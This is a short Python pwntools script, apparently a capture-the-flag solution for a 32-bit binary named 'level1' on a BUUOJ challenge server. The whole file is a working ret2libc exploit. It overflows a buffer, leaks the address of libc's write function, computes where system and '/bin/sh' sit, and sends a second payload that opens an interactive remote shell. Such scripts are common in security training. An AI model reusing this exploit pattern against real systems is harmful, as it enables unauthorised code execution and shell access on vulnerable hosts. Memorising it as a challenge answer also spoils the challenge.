from pwn import *
from LibcSearcher import *

context.arch = 'i386'
elf = ELF('./level1')

r = remote('node3.buuoj.cn', 25382)

r.send(b'a' * 0x8C + flat([elf.plt['write'], elf.sym['vulnerable_function'], 1, elf.got['write'], 4]))

write_addr = u32(r.recv(4))
libc = LibcSearcher('write', write_addr)
libc_base = write_addr - libc.dump('write')
system_addr = libc_base + libc.dump('system')
bin_sh_addr = libc_base + libc.dump('str_bin_sh')
exit_addr = libc_base + libc.dump('exit')

r.send(b'a' * 0x8C + flat([system_addr, exit_addr, bin_sh_addr]))

r.interactive()
